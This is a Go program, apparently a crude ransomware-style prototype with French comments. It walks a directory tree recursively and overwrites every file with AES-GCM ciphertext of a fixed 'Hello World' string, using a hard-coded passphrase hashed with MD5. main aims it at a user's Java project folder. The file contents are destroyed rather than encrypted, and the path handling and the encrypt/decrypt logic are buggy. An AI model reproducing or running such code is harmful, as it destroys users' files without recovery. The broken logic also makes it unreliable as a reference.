package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/md5"
    "crypto/rand"
    "encoding/hex"
    "fmt"
    "io"
    "io/ioutil"
    "strings"
)

func createHash(key string) string {
    hasher := md5.New()
    hasher.Write([]byte(key))
    return hex.EncodeToString(hasher.Sum(nil))
}

func encrypt(data []byte, passphrase string) []byte {
    block, _ := aes.NewCipher([]byte(createHash(passphrase)))
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        panic(err.Error())
    }
    nonce := make([]byte, gcm.NonceSize())
    if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
        panic(err.Error())
    }
    ciphertext := gcm.Seal(nonce, nonce, data, nil)
    return ciphertext
}

func decrypt(data []byte, passphrase string) []byte {
    key := []byte(createHash(passphrase))
    block, err := aes.NewCipher(key)
    if err != nil {
        panic(err.Error())
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        panic(err.Error())
    }
    nonceSize := gcm.NonceSize()
    nonce, ciphertext := data[:nonceSize], data[nonceSize:]
    plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
    if err != nil {
        panic(err.Error())
    }
    return plaintext
}
func cut(path string) string {

   


    path=path[:strings.LastIndexAny(path, "/")+1]


    return path
}

func check(e error) {
    if e != nil {
        panic(e)
    }
}
func lister(path string){
        entries, err := ioutil.ReadDir(path)
         //path=strings.TrimRight(path,"/")

    if err != nil {

        fmt.Println(err)
    }
    for i, entry := range entries {
        /*
    fmt.Println(entry.Name())    // Nom du fichier ("myphoto.jpg")
    fmt.Println(entry.Size())    // Taille en octet (/1024 = Ko)
    fmt.Println(entry.Mode())    // Droits d'écritures "-rw-rw-rw-"
    fmt.Println(entry.ModTime()) // Date de dernière modification
    fmt.Println(entry.IsDir())   // "false" par défaut (car on ne liste pas des "directories" / répertoires)
    */
    fmt.Println(i)
    //fmt.Println(path+entry.Name())

    if(!entry.IsDir() ){
        //ciphertext := encrypt([]byte("Hello World"), "password")
    d1 := []byte(encrypt([]byte("Hello World\n"), "password"))
    //d2 := []byte( decrypt(ciphertext, "password"))
    err := ioutil.WriteFile(path+entry.Name(), d1, 0644)
    check(err)
    //err1 := ioutil.WriteFile(path+entry.Name(), d2, 0644)
    //check(err1)
    fmt.Println(path+entry.Name())
    }
    
    
    if(entry.IsDir()){
        path =path+entry.Name()+"/"

        lister(path)
        //fmt.Println(path)
        path=strings.TrimRight(path,"/")
        path=strings.TrimRight(path,entry.Name())
        //fmt.Println(path)
    }

}
}
func lister_dech(path string){
        entries, err := ioutil.ReadDir(path)
         //path=strings.TrimRight(path,"/")

    if err != nil {

        fmt.Println(err)
    }
    for i, entry := range entries {
        /*
    fmt.Println(entry.Name())    // Nom du fichier ("myphoto.jpg")
    fmt.Println(entry.Size())    // Taille en octet (/1024 = Ko)
    fmt.Println(entry.Mode())    // Droits d'écritures "-rw-rw-rw-"
    fmt.Println(entry.ModTime()) // Date de dernière modification
    fmt.Println(entry.IsDir())   // "false" par défaut (car on ne liste pas des "directories" / répertoires)
    */
    fmt.Println(i)
    //fmt.Println(path+entry.Name())

    if(!entry.IsDir() ){
        ciphertext := encrypt([]byte("Hello World"), "password")

    d2 := []byte( decrypt(ciphertext, "password"))
 
    err1 := ioutil.WriteFile(path+entry.Name(), d2, 0644)
    check(err1)
    fmt.Println(path+entry.Name())
    }
    
    
    if(entry.IsDir()){
        path =path+entry.Name()+"/"

        lister(path)
        //fmt.Println(path)
        path=strings.TrimRight(path,"/")
        path=strings.TrimRight(path,entry.Name())
        //fmt.Println(path)
    }

}
}
func main() {


    path := "/home/user/Bureau/R/src/main/java/fr/uvsq/inf103/rogue_like/creature/"

    lister_dech(path)
    //lister_arbo(path)


}